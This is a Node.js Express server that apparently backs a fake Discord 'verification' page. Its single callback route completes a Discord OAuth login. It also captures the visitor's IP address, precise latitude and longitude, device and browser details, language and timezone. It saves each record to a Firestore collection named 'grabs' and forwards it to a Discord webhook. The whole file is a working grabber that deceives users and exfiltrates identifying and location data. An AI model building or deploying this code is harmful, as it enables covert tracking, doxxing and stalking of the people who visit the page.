const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

admin.initializeApp({
  credential: admin.credential.cert(require('./firebase.json')) // your Firebase service account
});
const db = admin.firestore();

app.post('/callback', async (req, res) => {
  const {
    code,
    platform,
    screenResolution,
    userAgent,
    language,
    timezone,
    latitude,
    longitude
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date();
  const ts = {
    seconds: Math.floor(timestamp.getTime() / 1000),
    nanoseconds: (timestamp.getTime() % 1000) * 1e6
  };

  let discordUserId = 'unknown';
  let discordUsername = 'unknown';

  try {
    // Step 1: Exchange code for token
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: process.env.REDIRECT_URI,
        scope: 'identify'
      }), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

    const accessToken = tokenRes.data.access_token;

    // Step 2: Get user info
    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    discordUserId = userRes.data.id;
    discordUsername = `${userRes.data.username}#${userRes.data.discriminator}`;
  } catch (err) {
    console.error('Discord OAuth error:', err.response?.data || err.message);
  }

  const payload = {
    ip,
    code,
    discordUserId,
    discordUsername,
    latitude,
    longitude,
    timezone,
    platform,
    screenResolution,
    userAgent,
    language,
    timestamp: timestamp.toISOString(),
    ts
  };

  try {
    // Save to Firebase
    const docRef = await db.collection('grabs').add(payload);
    payload.id = docRef.id;
  } catch (err) {
    console.error('Firebase error:', err.message);
  }

  try {
    // Send to Discord Webhook
    await axios.post(process.env.WEBHOOK_URL, {
      content: `**New Verification Data**\n` +
               `**Username:** ${discordUsername}\n` +
               `**Discord ID:** ${discordUserId}\n` +
               `**IP:** ${ip}\n` +
               `**Platform:** ${platform}\n` +
               `**Resolution:** ${screenResolution}\n` +
               `**Location:** ${latitude}, ${longitude}\n` +
               `**Language:** ${language} | **TZ:** ${timezone}\n` +
               `**User Agent:** ${userAgent}`
    });
  } catch (err) {
    console.error('Webhook error:', err.message);
  }

  res.status(200).json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
